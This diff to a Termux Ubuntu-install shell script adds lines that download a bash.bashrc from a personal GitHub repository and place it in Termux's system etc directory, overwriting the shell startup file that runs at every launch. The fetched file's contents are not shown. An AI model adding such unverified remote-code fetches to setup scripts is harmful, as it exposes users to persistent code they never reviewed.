@@ -7,5 +7,8 @@ apt install wget -y
 wget https://raw.githubusercontent.com/MFDGaming/ubuntu-in-termux/master/ubuntu.sh
 apt-get install proot -y
 apt-get install git -y
+cd /data/data/com.termux/files/usr/etc
+wget https://raw.githubusercontent.com/D071N/ubantu/main/bash.bashrc
+cd
 bash ubuntu.sh
 bash startubuntu.sh
